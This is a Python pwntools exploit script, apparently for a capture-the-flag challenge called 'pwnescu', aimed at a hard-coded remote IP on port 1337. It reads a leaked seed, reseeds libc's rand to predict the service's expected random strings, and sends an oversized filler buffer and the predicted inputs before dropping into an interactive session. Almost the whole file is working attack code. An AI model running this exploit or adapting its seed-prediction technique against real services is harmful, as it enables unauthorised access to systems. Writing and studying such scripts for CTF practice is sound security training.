#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string
from ctypes import *

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ "
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './pwnescu'
binary = ELF("pwnescu")

remote_server = '89.38.210.128'
PORT = 1337

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)
else:
    p = process(program_name)

if args.lib:
    libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
    r = main.process(env={'LD_PRELOAD' : libc.path})

if args.dbg:
    gdb.attach(p, '''
    vmmap
    ''')

# USEFUL FUNCTIONS
def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(x, y):
    x = p32(binary.symbols[y])
    # Example: read_got = p32(binary.symbols["read"])

def search_binsh():
    return libc.search("/bin/sh").next()

def gen_char(rand):
    num = rand % 65
    return num

def gen_100_rand():
    temp = ''
    for i in range(100):
        new = libc.rand()
        #print '[*]RAND =',new
        temp += tab[gen_char(new)]
        #print '==>',temp
    return temp

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    libc = CDLL('libc.so.6')
    payload = ''
    flag = 1

    leak = p.recvuntil('number is ')
    leak = p.recvline()
    print '[*]LEAK =',leak
    data = p.recvuntil('please!')

    libc.srand(int(leak,16))

    payload = gen_100_rand()
    payload2 = 'a'*0xfff
    p.send(payload2)
    #print '[+]PAYLOAD =',payload2

    for i in range(99):
        flag = 1
        payload = gen_100_rand()
        for i in payload[0:10]:
            if i >= 'A' and i <= 'Z':
                flag = 0
                break
        if flag:
            print '[++]GOOD PAYLOAD'
            print '[+]PAYLOAD =',payload
            p.send(payload[0:10])
            data = p.recv()
            print data
            data = p.recv()
            print data
        else:
            print '[%]UPPERCASE IN PAYLOAD',payload[0:10],len(payload[0:10])
            data = p.recv()
            print data
            p.send('a'*10)

    # memcmp = 0xe89
    # rand = 0xc99

    p.interactive()
